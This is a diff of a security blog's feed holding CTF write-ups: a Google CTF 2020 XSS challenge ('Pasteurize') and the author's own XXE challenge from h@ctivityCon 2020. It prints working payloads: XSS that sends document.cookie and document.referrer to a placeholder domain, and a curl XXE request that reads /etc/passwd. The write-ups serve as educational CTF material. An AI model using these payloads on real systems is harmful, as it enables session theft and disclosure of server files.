+&lt;p&gt;what if we put a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;&lt;/code&gt; in our input and get a DOM based XSS&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/escaped.png&quot; alt=&quot;escaped&quot; /&gt;&lt;/p&gt;
 
@@ -58,8 +605,8 @@ and the high number of solves to the challenge doesn’t make me feel like we ne
 nope, it’s not I went back the server side source code and I saw something interesting&lt;/p&gt;
 
 &lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/* Who wants a slice? */&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;escape_string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;unsafe&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stringify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;unsafe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;slice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/&amp;lt;/g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;x3C&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/&amp;gt;/g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;x3E&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;escape_string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;unsafe&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;stringify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;unsafe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;slice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/&amp;lt;/g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;x3C&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/&amp;gt;/g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;x3E&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;the comment was interesting, when I first looked at it I felt like it’s a useless thing
 since it encodes the greater/less than signs.&lt;/p&gt;
@@ -69,7 +616,7 @@ since it encodes the greater/less than signs.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/locally.png&quot; alt=&quot;locally&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;now I understood why the slice is important.
-I looked at examples online for JSON.stringify and saw that there’s only 1 case that doesn’t start with &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;&lt;/code&gt; which is when passing an object to it.&lt;/p&gt;
+I looked at examples online for JSON.stringify and saw that there’s only 1 case that doesn’t start with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;&lt;/code&gt; which is when passing an object to it.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/object.png&quot; alt=&quot;object&quot; /&gt;&lt;/p&gt;
 
@@ -79,7 +626,7 @@ that’s because my input is getting passed to the backend as a string not as an
 &lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/req.png&quot; alt=&quot;req&quot; /&gt;
 &lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/res.png&quot; alt=&quot;res&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;I did some research and then I remembered that I can send raw objects with &lt;code class=&quot;highlighter-rouge&quot;&gt;param[]=thing&lt;/code&gt; in http.&lt;/p&gt;
+&lt;p&gt;I did some research and then I remembered that I can send raw objects with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;param[]=thing&lt;/code&gt; in http.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/evil-req.png&quot; alt=&quot;req&quot; /&gt;
 &lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/evil-res.png&quot; alt=&quot;res&quot; /&gt;&lt;/p&gt;
@@ -87,14 +634,14 @@ that’s because my input is getting passed to the backend as a string not as an
 &lt;p&gt;DONE&lt;/p&gt;
 
 &lt;p&gt;crafting this payload&lt;/p&gt;
-&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/alert.png&quot; alt=&quot;alert&quot; /&gt;
 &lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/alerted-source.png&quot; alt=&quot;alerted-source&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;now time to hack TJMike&lt;/p&gt;
-&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://domain/&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://domain/&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/flag.png&quot; alt=&quot;flag&quot; /&gt;&lt;/p&gt;
@@ -126,7 +673,7 @@ so basically it’s xss&lt;/p&gt;
 
 &lt;p&gt;in here I updated the address with this payload&lt;/p&gt;
 
-&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;and it worked :) . &lt;br /&gt;
@@ -169,7 +716,7 @@ after researching it I realized it’s not working because the XSS is triggering
 &lt;p&gt;&lt;strong&gt;&lt;em&gt;all of that is useless&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
 
 &lt;p&gt;after sending a lot of requests I thought about leaking more info from what we have&lt;br /&gt;
-so I started getting &lt;code class=&quot;highlighter-rouge&quot;&gt;document.thing&lt;/code&gt; stuff and &lt;code class=&quot;highlighter-rouge&quot;&gt;document.referrer&lt;/code&gt; returned something cool&lt;/p&gt;
+so I started getting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;document.thing&lt;/code&gt; stuff and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;document.referrer&lt;/code&gt; returned something cool&lt;/p&gt;
 
 &lt;p&gt;the payload&lt;/p&gt;
 
@@ -177,16 +724,16 @@ so I started getting &lt;code class=&quot;highlighter-rouge&quot;&gt;document.th
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;spaces started messing, how the payload works so I base64 encoded it
-so I decoded it with &lt;code class=&quot;highlighter-rouge&quot;&gt;atob&lt;/code&gt; and executed it with &lt;code class=&quot;highlighter-rouge&quot;&gt;eval&lt;/code&gt;
+so I decoded it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;atob&lt;/code&gt; and executed it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eval&lt;/code&gt;
 the decoded value&lt;/p&gt;
 
 &lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;https://domain.com/leak?q=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;referrer&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;P.S: you can base64 encode in javascript with &lt;code class=&quot;highlighter-rouge&quot;&gt;btoa&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;P.S: you can base64 encode in javascript with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;btoa&lt;/code&gt;&lt;/p&gt;
 
 &lt;p&gt;I got the following url from the bot&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://typeselfsub.web.ctfcompetition.com/asofdiyboxzdfasdfyryryryccc?username=mike&amp;amp;password=j9as7ya7a3636ncvx&amp;amp;reason={mypayload here}
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://typeselfsub.web.ctfcompetition.com/asofdiyboxzdfasdfyryryryccc?username=mike&amp;amp;password=j9as7ya7a3636ncvx&amp;amp;reason={mypayload here}
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;then I went to that url and it auto logged me as admin :P&lt;/p&gt;
@@ -202,14 +749,14 @@ the decoded value&lt;/p&gt;
 &lt;h2 id=&quot;references&quot;&gt;references&lt;/h2&gt;
 
 &lt;p&gt;&lt;a href=&quot;https://portswigger.net/web-security/cross-site-scripting/&quot;&gt;xss&lt;/a&gt;&lt;br /&gt;
-tool used to get http requests &lt;a href=&quot;http://beeceptor.com/&quot;&gt;beeceptor&lt;/a&gt;&lt;/p&gt;</content><author><name>pop_eax</name></author><summary type="html">PASTEURIZE</summary></entry><entry><title type="html">thoughts on making CTFs</title><link href="http://localhost:4000/blog/posts/ctf-writeup/web/2020/08/01/h-cktivitycon-ctf-specialorder/" rel="alternate" type="text/html" title="thoughts on making CTFs" /><published>2020-08-01T15:04:00+03:00</published><updated>2020-08-01T15:04:00+03:00</updated><id>http://localhost:4000/blog/posts/ctf-writeup/web/2020/08/01/h-cktivitycon-ctf-specialorder</id><content type="html" xml:base="http://localhost:4000/blog/posts/ctf-writeup/web/2020/08/01/h-cktivitycon-ctf-specialorder/">&lt;h1 id=&quot;special-order-hctivitycon-ctf-2020&quot;&gt;Special Order h@ctivityCon CTF 2020&lt;/h1&gt;
+tool used to get http requests &lt;a href=&quot;http://beeceptor.com/&quot;&gt;beeceptor&lt;/a&gt;&lt;/p&gt;</content><author><name>pop_eax</name></author><summary type="html">PASTEURIZE</summary></entry><entry><title type="html">thoughts on making CTFs</title><link href="http://localhost:4000/blog/posts/ctf-writeup/web/2020/08/01/h-cktivitycon-ctf-specialorder/" rel="alternate" type="text/html" title="thoughts on making CTFs" /><published>2020-08-01T14:04:00+02:00</published><updated>2020-08-01T14:04:00+02:00</updated><id>http://localhost:4000/blog/posts/ctf-writeup/web/2020/08/01/h-cktivitycon-ctf-specialorder</id><content type="html" xml:base="http://localhost:4000/blog/posts/ctf-writeup/web/2020/08/01/h-cktivitycon-ctf-specialorder/">&lt;h1 id=&quot;special-order-hctivitycon-ctf-2020&quot;&gt;Special Order h@ctivityCon CTF 2020&lt;/h1&gt;
 
 &lt;p&gt;making a big CTF challenge was always on my todo list, yes I made a couple of CTF challenges before
 but none of them actually made it to such a big event.&lt;/p&gt;
 
 &lt;h2 id=&quot;challenge-writeup&quot;&gt;challenge writeup&lt;/h2&gt;
 
-&lt;p&gt;accessing the challenge url we get redirected to &lt;code class=&quot;highlighter-rouge&quot;&gt;/login&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;accessing the challenge url we get redirected to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/login&lt;/code&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/Login.png&quot; alt=&quot;login&quot; /&gt;&lt;/p&gt;
 
@@ -244,10 +791,10 @@ but none of them actually made it to such a big event.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/curl.png&quot; alt=&quot;curl&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;so let’s send an xxe payload&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;s1&quot;&gt;'http://ip/customize'&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
-      &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Content-Type: application/xml'&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
-      &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Cookie: session=sessionCookie'&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
-      &lt;span class=&quot;nt&quot;&gt;--data-binary&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&amp;lt;!DOCTYPE foo [  &amp;lt;!ELEMENT foo ANY &amp;gt;&amp;lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &amp;gt;]&amp;gt;&amp;lt;root&amp;gt;&amp;lt;color&amp;gt;&amp;amp;xxe;&amp;lt;/color&amp;gt;&amp;lt;size&amp;gt;20px&amp;lt;/size&amp;gt;&amp;lt;/root&amp;gt;'&lt;/span&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;s1&quot;&gt;&apos;http://ip/customize&apos;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;Content-Type: application/xml&apos;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;Cookie: session=sessionCookie&apos;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;--data-binary&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&amp;lt;!DOCTYPE foo [  &amp;lt;!ELEMENT foo ANY &amp;gt;&amp;lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &amp;gt;]&amp;gt;&amp;lt;root&amp;gt;&amp;lt;color&amp;gt;&amp;amp;xxe;&amp;lt;/color&amp;gt;&amp;lt;size&amp;gt;20px&amp;lt;/size&amp;gt;&amp;lt;/root&amp;gt;&apos;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/passwd.png&quot; alt=&quot;passwd&quot; /&gt;&lt;/p&gt;
@@ -267,7 +814,7 @@ and thought I can’t make it on time or I can’t even do it&lt;/p&gt;
   &lt;li&gt;create a blog&lt;/li&gt;
   &lt;li&gt;add the ability to share posts&lt;/li&gt;
   &lt;li&gt;make the looks customizable&lt;/li&gt;
-  &lt;li&gt;make the &lt;code class=&quot;highlighter-rouge&quot;&gt;/customize&lt;/code&gt; endpoint accept json and xml&lt;/li&gt;
+  &lt;li&gt;make the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/customize&lt;/code&gt; endpoint accept json and xml&lt;/li&gt;
   &lt;li&gt;parse the xml and make it xxe-able&lt;/li&gt;
 &lt;/ul&gt;
 
@@ -281,28 +828,28 @@ I had a little bit of SQLAlchemy experince before, but it needed some refresh
 I am not sure if this is the most “efficient” learning way but I like it and it works better for me.&lt;/p&gt;
 
 &lt;p&gt;so I ended up with this db model&lt;/p&gt;
-&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;User&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Model&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;__tablename__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;users&quot;&lt;/span&gt;
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;User&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Model&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;__tablename__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
 
-    &lt;span class=&quot;n&quot;&gt;uuid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Column&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Integer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;primary_key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Column&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unique&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Column&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
